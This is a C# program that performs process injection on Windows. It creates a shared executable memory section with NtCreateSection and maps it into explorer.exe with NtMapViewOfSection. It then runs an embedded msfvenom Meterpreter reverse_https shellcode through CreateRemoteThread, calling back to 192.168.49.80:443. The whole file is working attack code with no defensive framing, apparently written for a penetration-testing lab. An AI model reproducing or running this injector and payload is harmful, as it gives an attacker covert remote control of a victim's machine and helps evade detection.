using System;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace Inject_Alternative_NtCreate
{
    class Program
    {
        [Flags]
        //Setting relevant values into pre-built enum's for use throughout the code
        //Found through various pieces of Microsoft documentation and implementations of cpp code
        public enum MemoryStates : uint
        {
            MEM_COMMIT = 0x1000,
            MEM_RESERVE = 0x2000,
            MEM_FREE = 0x10000
        }
        public enum Protection : uint
        {
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40
        }

        public enum SectionCodes : uint
        {
            SEC_COMMIT = 0x08000000,
            SECTION_MAP_WRITE = 0x0002,
            SECTION_MAP_READ = 0x0004,
            SECTION_MAP_EXECUTE = 0x0008,
            SECTION_ALL_ACCESS = SECTION_MAP_WRITE | SECTION_MAP_READ | SECTION_MAP_EXECUTE,
            ALL_RIGHTS = 0x001F0FFF
        }

        public enum InheritDisposition
        {
            ViewUnmap = 2
        }



        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        static extern uint NtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize, UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, UIntPtr ZeroBits, UIntPtr CommitSize, out ulong SectionOffset, out uint ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
        static extern int NtClose(IntPtr hObject);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();



        static void Main(string[] args)
        {

            //Shellcode generated with msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.80 LPORT=443 -f csharp
            byte[] buf = new byte[696] {
                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
                0x20,0x51,0x56,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
                0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
                0x01,0xc1,0xe2,0xed,0x52,0x48,0x8b,0x52,0x20,0x41,0x51,0x8b,0x42,0x3c,0x48,
                0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
                0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x44,0x8b,
                0x40,0x20,0x49,0x01,0xd0,0x8b,0x48,0x18,0x50,0xe3,0x56,0x48,0xff,0xc9,0x41,
                0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0x41,0xc1,0xc9,
                0x0d,0xac,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
                0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,
                0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,
                0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,
                0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
                0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,
                0x6e,0x65,0x74,0x00,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,
                0x07,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,
                0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x00,0x00,0x00,0x00,0xff,0xd5,
                0xe8,0x0e,0x00,0x00,0x00,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x34,0x39,
                0x2e,0x38,0x30,0x00,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0xbb,0x01,0x00,0x00,
                0x4d,0x31,0xc9,0x53,0x53,0x6a,0x03,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x00,
                0x00,0x00,0x00,0xff,0xd5,0xe8,0x8f,0x00,0x00,0x00,0x2f,0x51,0x32,0x4c,0x49,
                0x71,0x45,0x4a,0x69,0x4b,0x61,0x66,0x44,0x39,0x73,0x4c,0x30,0x6f,0x76,0x78,
                0x70,0x41,0x67,0x33,0x35,0x76,0x37,0x74,0x74,0x59,0x44,0x4b,0x70,0x79,0x46,
                0x75,0x65,0x5a,0x53,0x79,0x67,0x47,0x37,0x31,0x67,0x77,0x37,0x75,0x75,0x50,
                0x61,0x4d,0x49,0x39,0x48,0x48,0x31,0x77,0x54,0x44,0x39,0x61,0x56,0x59,0x67,
                0x34,0x52,0x62,0x45,0x57,0x32,0x51,0x52,0x70,0x66,0x79,0x74,0x47,0x55,0x33,
                0x78,0x6d,0x74,0x58,0x47,0x38,0x47,0x65,0x2d,0x58,0x52,0x31,0x49,0x46,0x71,
                0x57,0x76,0x65,0x73,0x74,0x71,0x33,0x51,0x6d,0x68,0x55,0x4d,0x65,0x59,0x4f,
                0x66,0x4a,0x4f,0x5a,0x76,0x6e,0x34,0x51,0x2d,0x32,0x37,0x62,0x43,0x33,0x41,
                0x42,0x2d,0x49,0x51,0x30,0x63,0x44,0x52,0x54,0x55,0x4d,0x36,0x52,0x30,0x65,
                0x36,0x72,0x00,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,
                0xb8,0x00,0x32,0xa8,0x84,0x00,0x00,0x00,0x00,0x50,0x53,0x53,0x49,0xc7,0xc2,
                0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0x0a,0x5f,0x48,0x89,0xf1,
                0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33,0x00,0x00,0x49,0x89,0xe0,0x6a,0x04,0x41,
                0x59,0x49,0xba,0x75,0x46,0x9e,0x86,0x00,0x00,0x00,0x00,0xff,0xd5,0x4d,0x31,
                0xc0,0x53,0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,
                0xc7,0xc2,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,
                0x88,0x13,0x00,0x00,0x49,0xba,0x44,0xf0,0x35,0xe0,0x00,0x00,0x00,0x00,0xff,
                0xd5,0x48,0xff,0xcf,0x74,0x02,0xeb,0xaa,0xe8,0x55,0x00,0x00,0x00,0x53,0x59,
                0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x00,0x10,0x00,
                0x00,0x49,0xba,0x58,0xa4,0x53,0xe5,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x93,
                0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x00,
                0x20,0x00,0x00,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x00,0x00,0x00,
                0x00,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x07,0x48,
                0x01,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,
                0xf0,0xb5,0xa2,0x56,0xff,0xd5 };

            int len = buf.Length;
            uint unsignedLen = (uint)len;

            //Identify our current process handle
            IntPtr cHandle = Process.GetCurrentProcess().Handle;
            string cProcessName = Process.GetCurrentProcess().ProcessName;
            Console.WriteLine($"[*] Got handle on current process ({cProcessName}): {cHandle}");

            //Define our target process, I'll use explorer as it'll stay active as long as the users desktop session is active
            string tProcess = "explorer"; //Alternate if you wish to inject into another process, such as notepad
            int tProcessPid = Process.GetProcessesByName(tProcess)[0].Id; //Just the first index, incase there is multiple processes running

            if (tProcessPid >= 0)
            {
                Console.WriteLine($"[*] Got ID of target process ({tProcess}): {tProcessPid}");
            }
            else
            {
                Console.WriteLine($"[*] {tProcess} ID is not being correctly found, have you definitely inserted a valid process name?");
                Environment.Exit(0);
            }

            //Get the target process handle
            IntPtr tProcessHandle = OpenProcess((uint)SectionCodes.ALL_RIGHTS, false, tProcessPid);
            Console.WriteLine($"[*] Got handle of target process ({tProcess}): {tProcessHandle}");

            //Setting up the shared section using help from MSDN on NtCreateSection and http://www.pinvoke.net/default.aspx/ntdll/NtCreateSection.html
            IntPtr section_ = new IntPtr();

            long checkSection = NtCreateSection(ref section_, (uint)SectionCodes.SECTION_ALL_ACCESS, IntPtr.Zero, ref unsignedLen, (uint)Protection.PAGE_EXECUTE_READWRITE, (uint)SectionCodes.SEC_COMMIT, IntPtr.Zero);

            //0 = success
            if (checkSection == 0)
            {
                Console.WriteLine($"[*] Created section with length of given shellcode: {len} bytes. Section {section_} created");
            }
            else
            {
                Console.WriteLine($"[!] Failed to create section! Failure: {checkSection}");
                Environment.Exit(0);
            }

            //Map the view of the local process to the section- No MSDN page so working with this
            //http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FSECTION_INHERIT.html
            IntPtr localAddress = new IntPtr();
            ulong sOffsetL = new ulong();
            uint vSizeL = unsignedLen;

            uint lmapCheck = NtMapViewOfSection(section_, cHandle, ref localAddress, UIntPtr.Zero, UIntPtr.Zero, out sOffsetL, out vSizeL, (uint)InheritDisposition.ViewUnmap, 0, (uint)Protection.PAGE_EXECUTE_READWRITE);

            if (lmapCheck == 0)
            {
                Console.WriteLine($"[*] Mapped local section at {localAddress} with a size of {vSizeL} for process handle {cHandle}");

            }
            else
            {
                Console.WriteLine($"[!] Failed to create local section!");
                Environment.Exit(0);
            }


            //Map the same view of the target process to the section 
            IntPtr remoteAddress = new IntPtr();
            ulong sOffsetR = new ulong();
            uint vSizeR = unsignedLen;
            uint rmapCheck = NtMapViewOfSection(section_, tProcessHandle, ref remoteAddress, UIntPtr.Zero, UIntPtr.Zero, out sOffsetR, out vSizeR, (uint)InheritDisposition.ViewUnmap, 0, (uint)Protection.PAGE_EXECUTE_READWRITE);

            if (rmapCheck == 0)
            {
                Console.WriteLine($"[*] Mapped remote section at {remoteAddress} with a size of {vSizeR} for process handle {tProcessHandle}");
            }
            else
            {
                Console.WriteLine($"[!] Failed to create remote section!");
                Environment.Exit(0);
            }


            //Copy shellcode into the local mapped area, should reflect into the mapping of the target process
            Marshal.Copy(buf, 0, localAddress, len);
            Console.WriteLine($"[*] Moved the shellcode to the mapped memory! It starts at {localAddress}");

            //Execute the shellcode by starting a thread pointing at the start of the section
            IntPtr res = CreateRemoteThread(tProcessHandle, IntPtr.Zero, 0, remoteAddress, IntPtr.Zero, 0, IntPtr.Zero);

            if (res != IntPtr.Zero)
            {
                Console.WriteLine($"[*] Shellcode successfully injected into process: {tProcess}! (Process ID: {tProcessPid}, Success = {res != IntPtr.Zero})\n[*] Check your listener.");
            }
            else
            {
                Console.WriteLine($"[!] Failed during the creation of the remote process!");
            }

            //Unmap the created local mapping
            uint unmapCheck = NtUnmapViewOfSection(cHandle, localAddress);
            if (unmapCheck == 0)
            {
                Console.WriteLine($"[*] Mapped local section successfully unmapped!");
            }
            else
            {
                Console.WriteLine($"[!] Failed to unmap the local section!");
                Environment.Exit(0);
            }


            //Close the opened section
            int closedCheck = NtClose(section_);
            if (closedCheck == 0)
            {
                Console.WriteLine($"[*] Section successfully closed.");
            }
            else
            {
                Console.WriteLine($"[!] Failed to close the section!");
                Environment.Exit(0);
            }

        }

    }

}
